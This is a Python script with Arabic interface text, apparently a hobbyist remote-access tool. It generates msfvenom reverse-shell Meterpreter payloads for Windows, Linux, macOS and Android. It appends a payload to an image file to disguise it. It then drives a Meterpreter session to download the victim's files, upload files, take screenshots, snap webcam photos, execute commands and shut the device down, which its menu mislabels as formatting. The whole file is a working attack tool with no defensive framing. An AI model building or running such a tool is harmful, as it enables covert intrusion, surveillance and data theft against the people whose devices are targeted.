import os
import subprocess
import socket
from colorama import Fore, Style, init

# Initialize colorama
init()

def get_default_lhost():
    """
    الحصول على عنوان IP المحلي (LHOST) للجهاز.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))  # أي عنوان بعيد لتحفيز الاتصال
        lhost = s.getsockname()[0]
    except:
        lhost = '127.0.0.1'  # fallback to localhost
    finally:
        s.close()
    return lhost

def banner():
    """
    عرض الشعار الخاص بالأداة.
    """
    print(Fore.CYAN + """
    مرحبا حمزة
    مرحبا حمزة
    مرحبا حمزة
                """ + Style.RESET_ALL)
    print(Fore.YELLOW + "               تم التطوير بواسطة: مُحَمَّد صَادِق أَحْمَد".center(85) + Style.RESET_ALL)
    print(Fore.MAGENTA + "--------------------------------------------------------------------------------".center(85) + Style.RESET_ALL)

def create_payload():
    """
    إنشاء بايلود لنظام التشغيل الذي يختاره المستخدم.
    """
    print(Fore.CYAN + "اختر النظام الذي تريد إنشاء بايلود له:" + Style.RESET_ALL)
    print("1. Windows")
    print("2. Linux")
    print("3. macOS")
    print("4. Android")
    print("5. iOS (تنبيه فقط، ليس مدعومًا بشكل مباشر)")

    # استخدام LHOST و LPORT الافتراضيين
    lhost = get_default_lhost()
    lport = '4444'  # تعيين قيمة ثابتة للبورت

    print(Fore.YELLOW + f"تم استخدام LHOST: {lhost} و LPORT: {lport}" + Style.RESET_ALL)
    
    choice = input(Fore.YELLOW + "أدخل خيارك: " + Style.RESET_ALL)
    
    if choice == '1':
        payload_name = "payload.exe"
        command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {payload_name}"
        
    elif choice == '2':
        payload_name = "payload.elf"
        command = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {payload_name}"
        
    elif choice == '3':
        payload_name = "payload.macho"
        command = f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o {payload_name}"
        
    elif choice == '4':
        payload_name = "payload.apk"
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {payload_name}"
        
    elif choice == '5':
        print(Fore.YELLOW + "تنبيه: لا يمكن إنشاء بايلودات مباشرة لـ iOS باستخدام msfvenom." + Style.RESET_ALL)
        return
    
    else:
        print(Fore.RED + "خيار غير صحيح!" + Style.RESET_ALL)
        return
    
    try:
        # تنفيذ الأمر لإنشاء البايلود
        print(Fore.GREEN + f"جاري إنشاء البايلود: {payload_name}..." + Style.RESET_ALL)
        subprocess.run(command, shell=True)
        print(Fore.GREEN + f"تم إنشاء البايلود وحفظه في {payload_name}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"فشل إنشاء البايلود: {e}" + Style.RESET_ALL)

def merge_payload_with_image(payload_path, image_path, output_path):
    """
    دمج البايلود مع الصورة وحفظها في مسار معين.
    """
    try:
        with open(payload_path, 'rb') as payload_file:
            payload_data = payload_file.read()
        with open(image_path, 'rb') as image_file:
            image_data = image_file.read()

        # دمج البايلود مع الصورة
        combined_data = image_data + payload_data

        with open(output_path, 'wb') as combined_file:
            combined_file.write(combined_data)

        print(Fore.GREEN + f"تم دمج البايلود مع الصورة وحفظه في {output_path}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"فشل دمج البايلود مع الصورة: {e}" + Style.RESET_ALL)

def control_device():
    """
    التحكم بالجهاز الهدف.
    """
    while True:
        print(Fore.CYAN + "\nخيارات التحكم بالجهاز:")
        print("1. عرض الملفات على الجهاز")
        print("2. تحميل ملف من الجهاز")
        print("3. رفع ملف إلى الجهاز")
        print("4. أخذ لقطة شاشة")
        print("5. تشغيل كاميرا الويب")
        print("6. تنفيذ أمر")
        print("7. فرمتة الجهاز")
        print("8. الخروج من قائمة التحكم" + Style.RESET_ALL)
        choice = input(Fore.YELLOW + "أدخل خيارك: " + Style.RESET_ALL)

        if choice == '1':
            print(Fore.CYAN + "جاري عرض الملفات..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; ls'])

        elif choice == '2':
            file_path = input(Fore.YELLOW + "أدخل مسار الملف لتحميله: " + Style.RESET_ALL)
            print(Fore.CYAN + f"جاري تحميل {file_path}..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', f'sessions -i 1; download {file_path}'])

        elif choice == '3':
            local_file = input(Fore.YELLOW + "أدخل مسار الملف لرفعه: " + Style.RESET_ALL)
            target_path = input(Fore.YELLOW + "أدخل المسار الهدف: " + Style.RESET_ALL)
            print(Fore.CYAN + f"جاري رفع {local_file} إلى {target_path}..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', f'sessions -i 1; upload {local_file} {target_path}'])

        elif choice == '4':
            print(Fore.CYAN + "جاري أخذ لقطة شاشة..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; screenshot'])

        elif choice == '5':
            print(Fore.CYAN + "جاري تشغيل كاميرا الويب..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; webcam_snap'])

        elif choice == '6':
            command = input(Fore.YELLOW + "أدخل الأمر للتنفيذ: " + Style.RESET_ALL)
            print(Fore.CYAN + f"جاري تنفيذ: {command}" + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', f'sessions -i 1; execute -f {command}'])

        elif choice == '7':
            print(Fore.CYAN + "جاري فرمتة الجهاز..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; shutdown'])

        elif choice == '8':
            print(Fore.GREEN + "الخروج من قائمة التحكم." + Style.RESET_ALL)
            break

        else:
            print(Fore.RED + "خيار غير صحيح. حاول مرة أخرى!" + Style.RESET_ALL)

def main():
    """
    الوظيفة الرئيسية لتشغيل الأداة.
    """
    while True:
        banner()
        print(Fore.YELLOW + """
        1. إنشاء بايلودات
        2. دمج بايلود مع صورة
        3. التحكم بالجهاز الهدف
        4. الخروج
        """ + Style.RESET_ALL)

        choice = input(Fore.CYAN + "أدخل خيارك: " + Style.RESET_ALL)

        if choice == '1':
            create_payload()

        elif choice == '2':
            payload_file = input(Fore.YELLOW + "أدخل اسم البايلود (مثل: payload.exe): " + Style.RESET_ALL)
            image_file = input(Fore.YELLOW + "أدخل اسم الصورة (مثل: image.jpg): " + Style.RESET_ALL)
            output_file = os.path.join(os.path.expanduser("~"), "Desktop", "merged_image.jpg")  # حفظ على سطح المكتب
            merge_payload_with_image(payload_file, image_file, output_file)

        elif choice == '3':
            control_device()

        elif choice == '4':
            print(Fore.GREEN + "الخروج من الأداة. وداعًا!" + Style.RESET_ALL)
            break

        else:
            print(Fore.RED + "خيار غير صحيح. حاول مرة أخرى!" + Style.RESET_ALL)

if __name__ == '__main__':
    main()
